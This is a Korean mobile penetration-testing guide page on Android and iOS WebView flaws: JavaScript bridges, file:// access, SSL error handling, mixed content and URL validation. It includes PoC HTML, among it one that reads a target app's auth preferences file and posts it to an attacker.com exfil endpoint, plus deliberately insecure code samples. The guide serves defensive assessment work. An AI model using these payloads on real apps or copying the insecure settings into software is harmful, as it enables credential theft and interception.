---
sidebar_position: 12
title: WebView 결함
description: 모바일 진단 - Android/iOS WebView 결함 (JavaScript Interface / file:// 접근 / setAllowFileAccess / Mixed Content / URL 검증)
keywords: [WebView, WKWebView, UIWebView, addJavascriptInterface, setAllowFileAccess, Mixed Content, JavaScriptInterface, WKScriptMessageHandler, MASVS-PLATFORM]
draft: false
---

# WebView 결함
> 앱 내 WebView 가 (1) **JavaScript ↔ Native 브릿지** 를 안전하지 않게 노출하거나, (2) **file:// / 외부 URL** 을 검증 없이 로드하거나, (3) **Mixed Content / 비신뢰 인증서** 를 허용해 WebView 안에서 Native 자원 / 다른 앱 데이터 접근으로 이어지는 결함.

## 점검 개요

| 항목 | 내용 |
| :--- | :--- |
| **분류** | OWASP MASVS-PLATFORM-2 / MASTG-TEST-0033 (Android), 0066 (iOS) |
| **CWE** | [CWE-749: Exposed Dangerous Method](https://cwe.mitre.org/data/definitions/749.html), [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html), [CWE-200: Information Exposure](https://cwe.mitre.org/data/definitions/200.html) |
| **영향도** | 🔴 (Native 메서드 / Keychain / 파일 접근 가능) / 🟡 (단순 XSS / 정보 노출) |
| **점검 난이도** | 중 — 매니페스트 / Info.plist 점검 + WebView 설정 코드 정적 분석 + PoC HTML |
| **예상 점검 시간** | 1 ~ 4시간 |

---

## 점검 목적

WebView 는 모바일 앱 안의 미니 브라우저. **앱 권한 / Native 메서드 / 파일 시스템 접근이 결합되는 지점** 이라, 일반 웹 XSS 보다 영향이 큰 경우가 많다. 점검은 (1) WebView 설정의 위험 옵션, (2) Native 브릿지 노출, (3) URL 검증 부재, (4) 콘텐츠 출처 검증 부재 4가지를 본다.

> **다른 페이지와 영역 분리**
> - 일반 웹 XSS / CSP / 보안 헤더 → `assessment/web/xss.md`, `security-headers.md`
> - WebView 내 SSL Pinning → `ssl-pinning-bypass.md`
> - WebView 의 LocalStorage / Cookie 평문 저장 → `data-storage-android.md`, `data-storage-ios.md`
> - Custom URL Scheme / Universal Link / Intent (외부 호출) → `deeplink-intent.md`

---

## 유형 구분

### Android

| 결함 | 핵심 | 영향 |
| :--- | :--- | :--- |
| **`addJavascriptInterface` 노출** | JS → Java 메서드 호출 | API 17 미만 = RCE / 17+ = `@JavascriptInterface` 표시된 메서드만 |
| **`setAllowFileAccess(true)`** | `file://` URL 로드 허용 (Android 11+ 기본 false) | 앱 컨테이너 / SD 카드 파일 읽기 |
| **`setAllowFileAccessFromFileURLs(true)`** | `file://` 페이지에서 다른 `file://` 접근 | 다른 앱 파일까지 노출 |
| **`setAllowUniversalAccessFromFileURLs(true)`** | `file://` 에서 모든 origin 접근 | 가장 위험 — XSS + 파일 + 외부 origin 결합 |
| **`setJavaScriptEnabled(true)` + 비신뢰 콘텐츠** | 외부 URL / 사용자 입력 로드 | XSS → JavaScriptInterface 결합 시 RCE 표면 |
| **`setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)`** | HTTPS 페이지에서 HTTP 리소스 로드 | MITM 시 페이지 변조 |
| **`shouldOverrideUrlLoading` 부재 / URL 화이트리스트 부재** | 외부 사이트 / 임의 URL 로드 | 피싱 / XSS → Intent 결합 |
| **`onReceivedSslError` 에서 `proceed()`** | 잘못된 인증서 무시 | MITM 가능 |

### iOS

| 결함 | 핵심 | 영향 |
| :--- | :--- | :--- |
| **`UIWebView` 사용** | iOS 12+ deprecated, App Store 거부 가능 | 즉시 미흡 — `WKWebView` 로 마이그레이션 필수 |
| **`WKScriptMessageHandler` 검증 부재** | JS → Native 메시지 핸들러 | 메시지 본문 신뢰 시 임의 Native 액션 |
| **`javaScriptEnabled = true` + 비신뢰 URL** | 외부 URL 로드 | XSS → 메시지 핸들러 결합 |
| **`javaScriptCanOpenWindowsAutomatically = true`** | JS 가 새 창 열기 자동 | 피싱 / 우회 |
| **`loadFileURL:allowingReadAccessToURL:` 의 광범위 권한** | 상위 디렉토리까지 읽기 허용 | 앱 컨테이너 노출 |
| **`WKNavigationDelegate decidePolicyForNavigationAction` 부재** | URL 검증 없이 모두 로드 | 피싱 / Universal Link 우회 |
| **ATS 예외 (`NSAllowsArbitraryLoadsInWebContent`)** | WebView 만 HTTP 허용 | MITM |

---

## 진단 절차

### Step 1. 매니페스트 / Info.plist 점검
`static-analysis.md` 의 도구로 다음 확인:

```
Android (AndroidManifest.xml):
  - <application android:usesCleartextTraffic="true">                 위험
  - <network-security-config> 의 cleartextTrafficPermitted             동일
  - WebView 가 어디서 어떻게 사용되는지 (Activity / Fragment 검색)

iOS (Info.plist):
  - NSAppTransportSecurity → NSAllowsArbitraryLoadsInWebContent        WebView 만 HTTP 허용
  - LSApplicationQueriesSchemes / CFBundleURLTypes 도 함께 (deeplink-intent.md 와 결합)
```

### Step 2. WebView 설정 코드 정적 분석

`static-analysis.md` 의 jadx / Hopper 검색 키워드:

```
Android:
  - "WebView", "WebSettings", "WebViewClient"
  - "addJavascriptInterface", "@JavascriptInterface"
  - "setAllowFileAccess", "setAllowFileAccessFromFileURLs", "setAllowUniversalAccessFromFileURLs"
  - "setJavaScriptEnabled", "setMixedContentMode"
  - "shouldOverrideUrlLoading", "onReceivedSslError"

iOS:
  - "WKWebView", "UIWebView" (← UIWebView 발견 시 즉시 미흡)
  - "WKWebViewConfiguration", "WKUserContentController"
  - "WKScriptMessageHandler", "addScriptMessageHandler"
  - "javaScriptEnabled", "javaScriptCanOpenWindowsAutomatically"
  - "loadFileURL:allowingReadAccessToURL:"
  - "WKNavigationDelegate", "decidePolicyForNavigationAction"
```

### Step 3. 동적 검증 — PoC HTML 로 영향 입증

**Android**: 점검 단말의 PC 에서 `python3 -m http.server` 로 PoC HTML 호스팅 → 앱 내 WebView 로 로드 (외부 URL 로드 가능한 케이스만)
**iOS**: 동일

WebView 가 외부 URL 로드 불가하면 (앱 내부 HTML 만 사용) **Native 브릿지 노출 + 내부 HTML 자체에 XSS** 시나리오 점검.

---

## 페이로드 / 테스트 케이스

### 케이스 1 (Android): `addJavascriptInterface` + 외부 URL 로드 → 임의 Native 메서드 호출

**언제 점검하는지**: `WebView.addJavascriptInterface(obj, "Android")` 같은 호출이 jadx 에서 발견됐을 때.

**위험 코드 예시:**

```java
WebView webView = findViewById(R.id.webView);
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JsBridge(this), "Android");   // ← JS 에서 Android.* 호출 가능

class JsBridge {
    @JavascriptInterface
    public void saveAuthToken(String token) {                    // ← 임의 토큰 저장
        prefs.edit().putString("token", token).apply();
    }
    @JavascriptInterface
    public String getDeviceInfo() {                              // ← 단말 정보 노출
        return "{...}";
    }
}
```

**PoC HTML:**

```html
<!DOCTYPE html>
<html>
<body>
<script>
    // Native 메서드 호출 — saveAuthToken 변조
    if (typeof Android !== 'undefined') {
        Android.saveAuthToken('ATTACKER_TOKEN');
        document.body.innerText = 'Device info: ' + Android.getDeviceInfo();
    }
</script>
</body>
</html>
```

**판정**:

- WebView 가 외부 URL 로드 가능 + JavascriptInterface 노출 → **임의 사이트의 JS 가 Native 메서드 호출**
- API 17 미만 (Android 4.2 미만) 은 `@JavascriptInterface` 표시 없어도 모든 public 메서드 호출 가능 → **Reflection RCE** 가능
- API 17+ 라도 노출된 메서드의 위험도 평가 필수 (토큰 저장 / 결제 / 권한 변경 메서드 노출 시 Critical)

### 케이스 2 (Android): `setAllowUniversalAccessFromFileURLs` + `file://` 페이지 → 앱 컨테이너 파일 노출

**언제 점검하는지**: WebView 설정에 `setAllowFileAccess(true)` + `setAllowUniversalAccessFromFileURLs(true)` 가 보일 때. 결제 / 인증 영수증을 HTML 로 렌더링하는 앱에서 자주.

**위험 코드:**

```java
webView.getSettings().setAllowFileAccess(true);
webView.getSettings().setAllowFileAccessFromFileURLs(true);
webView.getSettings().setAllowUniversalAccessFromFileURLs(true);   // ← 가장 위험
webView.loadUrl("file:///android_asset/receipt.html");
```

**PoC HTML** (악성 `receipt.html` 또는 외부 URL 이 file:// 컨텍스트로 로드되는 케이스):

```html
<!DOCTYPE html>
<html>
<body>
<script>
// 1) 같은 file:// 도메인 — 다른 파일 읽기
var xhr = new XMLHttpRequest();
xhr.open('GET', 'file:///data/data/com.target.app/shared_prefs/auth_prefs.xml', false);
xhr.send();
document.body.innerText = xhr.responseText;   // ← 토큰 / 자격증명 노출

// 2) Universal Access — 외부 origin 으로 전송
fetch('https://attacker.com/exfil', {
    method: 'POST',
    body: xhr.responseText
});
</script>
</body>
</html>
```

**판정**: 앱 컨테이너의 평문 데이터 (SharedPreferences / DB) 가 WebView 로 노출 + 외부 origin 으로 전송 → Critical.

### 케이스 3 (Android): `shouldOverrideUrlLoading` 부재 → 임의 URL 로드 → 피싱

**언제 점검하는지**: WebView 가 사용자 입력 URL / 푸시 알림 / 딥링크 파라미터로 URL 을 받는 경우.

**위험 코드:**

```java
// WebViewClient 가 없거나 모든 URL 허용
webView.setWebViewClient(new WebViewClient());   // ← 기본 클라이언트, 모든 URL 로드 허용
webView.loadUrl(intent.getStringExtra("url"));   // ← 외부에서 받은 URL 그대로 로드
```

**시나리오:**

```
1) 공격자가 사용자에게 딥링크 전송:
   targetapp://open?url=https://attacker.com/fake-login.html

2) 앱이 WebView 에 attacker.com 로드
3) attacker.com 이 정상 앱과 동일한 UI 로 로그인 화면 표시
4) 사용자가 자격증명 입력 → 공격자 서버로 전송
```

**판정**: WebView 가 외부 URL 을 그대로 로드 + URL 화이트리스트 없음 → 피싱 / XSS 표면. `deeplink-intent.md` 와 결합 시나리오 점검.

### 케이스 4 (Android): `onReceivedSslError` 에서 `proceed()` — MITM 허용

**위험 코드:**

```java
webView.setWebViewClient(new WebViewClient() {
    @Override
    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
        handler.proceed();   // ← 모든 인증서 오류 무시
    }
});
```

**판정**: MITM 환경에서 임의 인증서로 응답 → 평문 캡처 / 변조. Critical.

### 케이스 5 (iOS): `UIWebView` 사용 — 즉시 미흡

**언제 점검하는지**: 정적 분석에서 `UIWebView` 클래스 사용 발견. iOS 12 부터 deprecated, App Store 거부 가능.

```objc
// 위험
UIWebView *webView = [[UIWebView alloc] initWithFrame:...];
[webView loadRequest:...];
```

**판정**: UIWebView 발견만으로 즉시 미흡 (사용 자체가 권장 안 됨). `WKWebView` 로 마이그레이션 필요.

### 케이스 6 (iOS): `WKScriptMessageHandler` 검증 부재

**언제 점검하는지**: WKWebView 의 `addScriptMessageHandler` 가 jadx-iOS / class-dump 에서 보일 때.

**위험 코드 예시:**

```swift
class JsBridgeHandler: NSObject, WKScriptMessageHandler {
    func userContentController(_ controller: WKUserContentController,
                               didReceive message: WKScriptMessage) {
        // 메시지 출처 검증 없이 처리
        if message.name == "saveToken" {
            let token = message.body as! String
            KeychainHelper.save(key: "token", value: token)     // ← 임의 토큰 저장
        }
    }
}

// 등록
let config = WKWebViewConfiguration()
config.userContentController.add(JsBridgeHandler(), name: "saveToken")
```

**PoC HTML:**

```html
<script>
window.webkit.messageHandlers.saveToken.postMessage('ATTACKER_TOKEN');
</script>
```

**판정**: 메시지 출처 (`message.frameInfo.request.url`) 검증 없이 신뢰 → 임의 사이트 / iframe 에서 호출 가능. Native 메서드 위험도에 따라 Medium ~ Critical.

### 케이스 7 (iOS): `loadFileURL:allowingReadAccessToURL:` 광범위 권한

**위험 코드:**

```swift
let url = Bundle.main.url(forResource: "receipt", withExtension: "html")!
webView.loadFileURL(url, allowingReadAccessToURL: URL(fileURLWithPath: "/"))   // ← 루트 디렉토리 읽기 허용
```

**판정**: `allowingReadAccessToURL` 가 상위 디렉토리 / 앱 컨테이너 전체로 설정되면 file:// HTML 이 다른 앱 데이터 읽기 가능. 권장은 해당 HTML 파일 디렉토리만:

```swift
webView.loadFileURL(url, allowingReadAccessToURL: url.deletingLastPathComponent())   // 안전
```

### 케이스 8 (Android+iOS): Mixed Content 허용 → HTTP 리소스 로드

**언제 점검하는지**: HTTPS 페이지인데 일부 리소스 (이미지 / 스크립트) 가 HTTP.

**Android:**

```java
webView.getSettings().setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);   // 위험
// 권장: MIXED_CONTENT_NEVER_ALLOW
```

**iOS:**

```
Info.plist:
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoadsInWebContent</key>
    <true/>                                          ← WebView 만 HTTP 허용
</dict>
```

**판정**: MITM 환경에서 HTTP 리소스 (예: 외부 스크립트) 변조 → WebView 페이지 변조 / XSS / 자격증명 탈취.

### 그 외 — 한 줄 언급

- **WebView 내 LocalStorage / IndexedDB 평문 저장** — `data-storage-*.md` 영역. 위치는 Android `/data/data/<pkg>/app_webview/Default/Local Storage/`, iOS `Library/WebKit/.../LocalStorage/`
- **Cookie 평문** — 동일. 토큰 / 세션이 쿠키에 평문 저장되는 케이스 빈번
- **WebView 디버깅 활성화** (`WebView.setWebContentsDebuggingEnabled(true)` in Release) — 디버거 attach 가능 → Medium
- **JsResult / JsAlert 결합 XSS** — 일반 웹 XSS 영역 (`assessment/web/xss.md`)

---

## 취약 판정 기준

다음 중 **하나라도** 해당하면 취약 / 미흡:

- [ ] **Android**: `addJavascriptInterface` 노출 + 외부 URL 로드 가능 (특히 API 17 미만 환경)
- [ ] **Android**: `setAllowFileAccessFromFileURLs(true)` 또는 `setAllowUniversalAccessFromFileURLs(true)`
- [ ] **Android**: `shouldOverrideUrlLoading` 부재 + 외부 URL 로드 + 화이트리스트 없음
- [ ] **Android**: `onReceivedSslError` 에서 `handler.proceed()` 무조건 호출
- [ ] **Android**: `setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)`
- [ ] **iOS**: `UIWebView` 사용 (deprecated)
- [ ] **iOS**: `WKScriptMessageHandler` 메시지 출처 (`frameInfo`) 검증 부재
- [ ] **iOS**: `loadFileURL:allowingReadAccessToURL:` 가 상위 디렉토리 / 광범위 권한
- [ ] **iOS**: `NSAllowsArbitraryLoadsInWebContent` 활성
- [ ] **공통**: WebView 디버깅 (`setWebContentsDebuggingEnabled(true)`) Release 빌드 활성
- [ ] **공통**: WebView 내 자격증명 / 토큰이 LocalStorage / Cookie 평문 저장

**오탐 주의:**

- [ ] 정적 HTML 만 로드 (외부 URL 없음) + 메시지 핸들러 없는 단순 표시용 WebView 는 영향 낮음
- [ ] `@JavascriptInterface` 표시된 메서드라도 노출 내용이 무해 (예: 단순 분석 이벤트) 면 영향 낮음
- [ ] `setAllowFileAccess` 는 Android 11 (API 30) 부터 기본 false — 신규 빌드는 자동 안전

---

## 다른 페이지로 위임

- **WebView 가 로드하는 페이지의 일반 웹 XSS** → `assessment/web/xss.md`
- **WebView 페이지의 CSP / 보안 헤더** → `assessment/web/security-headers.md`
- **딥링크 / 인텐트로 WebView URL 변조** → `deeplink-intent.md`
- **WebView 내 SSL Pinning** → `ssl-pinning-bypass.md`
- **WebView LocalStorage / Cookie 평문 저장** → `data-storage-android.md`, `data-storage-ios.md`
- **WebView 설정 코드 식별 (jadx / class-dump)** → `static-analysis.md`

---

## 참고자료

- [OWASP MASTG-TEST-0033 - WebView (Android)](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0033/)
- [OWASP MASTG-TEST-0066 - WebView (iOS)](https://mas.owasp.org/MASTG/tests/ios/MASVS-PLATFORM/MASTG-TEST-0066/)
- [Android - WebView Security Best Practices](https://developer.android.com/privacy-and-security/risks/insecure-webview)
- [Apple - WKWebView](https://developer.apple.com/documentation/webkit/wkwebview)
- [PortSwigger - Exploiting Android WebView Vulnerabilities](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags)
- [HackTricks - Android WebView Attacks](https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/webview-attacks)
- [HackTricks - iOS WebView](https://book.hacktricks.xyz/mobile-pentesting/ios-pentesting/ios-webviews)
- [Google - Android WebView Security Update](https://research.google/pubs/exploiting-android-webview/)
